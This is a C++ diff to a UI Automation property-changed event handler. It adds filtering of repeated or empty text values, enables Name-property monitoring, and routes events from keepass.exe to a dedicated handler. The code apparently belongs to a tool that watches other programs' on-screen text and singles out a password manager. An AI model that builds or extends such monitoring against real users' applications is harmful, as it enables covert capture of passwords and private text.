@@ -62,6 +62,8 @@ std::chrono::seconds MyPropertyChangedEventHandler::GetEventTimeout()
 HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::HandlePropertyChangedEvent(IUIAutomationElement* pAutomationElement, PROPERTYID propId, VARIANT vVar)
 {
 	//Log(L"Property changed", DBG);
+
+	// checks time
 	auto now = std::chrono::steady_clock::now();
 
 	if (now - lastEventTime < GetEventTimeout())
@@ -72,7 +74,22 @@ HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::HandlePropertyChangedEv
 
 	lastEventTime = now;
 
+	// checks new value
 	HRESULT hr = ERROR_SUCCESS;
+	if ((propId == UIA_NamePropertyId || propId == UIA_ValueValuePropertyId) && vVar.vt == VT_EMPTY)
+	{
+		return S_OK;
+	}
+
+	if (vVar.vt == VT_BSTR && (std::wstring(vVar.bstrVal) == oldTextValue) &&
+		(propId == UIA_NamePropertyId || propId == UIA_ValueValuePropertyId))
+	{
+		return S_OK;
+	}
+
+	if (vVar.vt == VT_BSTR)
+		oldTextValue = std::wstring(vVar.bstrVal);
+
 	DWORD pid = Finder::GetPIDByUIAutomationElement(pAutomationElement);
 
 	if (pid == -1)
@@ -93,6 +110,25 @@ HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::HandlePropertyChangedEv
 	std::wstring wsDate = Helpers::GetCurrentDateTime();
 
 	//Log(L"New event " + wsEventString + L" from " + wsProcName + L" Time: " + wsDate, DBG);
+
+	if (g_IgnoreHandlers)
+	{
+		HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar);
+	}
+	else {
+		std::unordered_map<std::wstring, std::function<void()>> handlers = {
+			{ L"keepass.exe", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleKeepass(pAutomationElement, wsProcName, wsDate, propId, vVar); } },
+		};
+
+		auto it = handlers.find(Helpers::ConvertToLower(wsProcName));
+
+		if (it != handlers.end()) {
+			it->second();
+		}
+		else {
+			HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar);
+		}
+	}
 
 	return S_OK;
 }
@@ -122,8 +158,10 @@ HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::Deploy(IUIAutomation* p
 
 	SysFreeString(bName);
 
+
+	// don't forget about adding property handling in "MyPropertyChangedEventHandlerApps.cpp"
 	std::vector<int> propertyIds = {
-		//UIA_NamePropertyId,
+		UIA_NamePropertyId,
 		UIA_ValueValuePropertyId
 	};
 
